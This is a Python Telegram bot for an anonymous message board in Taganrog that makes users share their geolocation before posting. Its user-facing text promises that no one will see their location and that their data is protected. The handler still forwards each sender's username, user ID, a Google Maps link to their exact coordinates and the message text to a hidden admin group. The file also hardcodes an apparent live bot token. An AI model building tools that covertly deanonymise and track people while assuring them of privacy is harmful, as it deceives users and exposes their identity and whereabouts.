import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from math import radians, sin, cos, sqrt, atan2

# Конфигурация
TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
ANON_GROUP_ID = -1002514617765
FORWARD_GROUP_ID = -1002698558394
VIDEO_LINK = "https://youtu.be/hK_cbdVPK-E"

# Геопараметры Таганрога
TAGANROG_CENTER = (47.2364, 38.8953)
ALLOWED_RADIUS_KM = 50

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# Клавиатура для запроса гео
geo_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("📍 Отправить геолокацию", request_location=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

def calculate_distance(lat1, lon1, lat2, lon2):
    """Безопасный расчет расстояния между точками"""
    try:
        R = 6371.0
        lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
        dlon = lon2 - lon1
        dlat = lat2 - lat1
        a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
        return R * (2 * atan2(sqrt(a), sqrt(1-a)))
    except Exception as e:
        logger.error(f"Ошибка расчета расстояния: {e}")
        return float('inf')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Приветственное сообщение с видеоинструкцией"""
    try:
        await update.message.reply_text(
            "Привет! Для отправки сообщения сначала поделись геолокацией:\n\n"
            "🔒 Никто не увидит твою геопозицию (антиспам)\n"
            f"📹 Инструкция: {VIDEO_LINK}",
            reply_markup=geo_keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Ошибка в start: {e}")

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Надежная обработка геолокации"""
    try:
        if not update.message or not update.message.location:
            raise ValueError("Геолокация не получена")

        location = update.message.location
        
        # Валидация координат
        if not (-90 <= location.latitude <= 90) or not (-180 <= location.longitude <= 180):
            raise ValueError("Некорректные координаты")

        distance = calculate_distance(
            TAGANROG_CENTER[0], TAGANROG_CENTER[1],
            location.latitude, location.longitude
        )

        # Сохраняем только при успешной проверке
        context.user_data['verified_geo'] = {
            'lat': location.latitude,
            'lon': location.longitude,
            'distance': distance,
            'valid': distance <= ALLOWED_RADIUS_KM,
            'user_id': update.message.from_user.id
        }

        await update.message.reply_text(
            f"✅ Геолокация принята ({distance:.1f} км от центра)\n"
            "Теперь отправь текст сообщения:",
            reply_markup=ReplyKeyboardMarkup.remove_keyboard()
        )

    except ValueError as ve:
        logger.warning(f"Ошибка геоданных: {ve}")
        await update.message.reply_text(
            "❌ Ошибка: некорректные данные геолокации\n"
            "Попробуй еще раз:",
            reply_markup=geo_keyboard
        )
        context.user_data.pop('verified_geo', None)

    except Exception as e:
        logger.error(f"Ошибка обработки гео: {e}")
        await update.message.reply_text(
            "⚠️ Ошибка системы. Попробуй позже",
            reply_markup=geo_keyboard
        )
        context.user_data.pop('verified_geo', None)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка сообщений с жесткой проверкой гео"""
    try:
        if update.message.chat.type != "private":
            return

        # Проверяем наличие подтвержденной геолокации
        if 'verified_geo' not in context.user_data:
            await update.message.reply_text(
                "⚠️ Сначала подтверди местоположение:\n"
                "🔒 Твои данные защищены",
                reply_markup=geo_keyboard
            )
            return

        geo_data = context.user_data['verified_geo']
        user = update.message.from_user

        # Формируем сообщение для админов
        admin_msg = (
            f"👤 Пользователь: @{user.username or 'N/A'} (ID: {user.id})\n"
            f"📍 Гео: https://maps.google.com/?q={geo_data['lat']},{geo_data['lon']}\n"
            f"📏 Расстояние: {geo_data['distance']:.1f} км\n\n"
            f"📝 Сообщение:\n{update.message.text}"
        )

        # Всегда отправляем админам
        await context.bot.send_message(FORWARD_GROUP_ID, admin_msg)

        # Отправляем в анонимный чат только если в радиусе
        if geo_data['valid']:
            await context.bot.send_message(
                ANON_GROUP_ID,
                f"✉️ Анонимное сообщение:\n\n{update.message.text}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Открыть", url=ANON_GROUP_LINK)]])
            )
            response = "✅ Сообщение отправлено админам! (@kmpr0 если что)"
        else:
            response = "❌ Ты вне зоны Таганрога"

        await update.message.reply_text(response)
        
        # Очищаем данные для следующего сообщения
        del context.user_data['verified_geo']
        await update.message.reply_text(
            "Для нового сообщения отправь геолокацию снова:",
            reply_markup=geo_keyboard
        )

    except Exception as e:
        logger.error(f"Ошибка обработки: {e}")
        await update.message.reply_text(
            "⚠️ Ошибка. Сообщение НЕ отправлено.\n"
            "Начни заново.",
            reply_markup=geo_keyboard
        )
        context.user_data.pop('verified_geo', None)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик критических ошибок"""
    logger.error(f"Системная ошибка: {context.error}", exc_info=True)
    if update and isinstance(update, Update) and update.message:
        await update.message.reply_text(
            "⚠️ Критическая ошибка. Попробуй позже.",
            reply_markup=geo_keyboard
        )

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    logger.info("Бот запущен с улучшенной обработкой гео")
    app.run_polling()
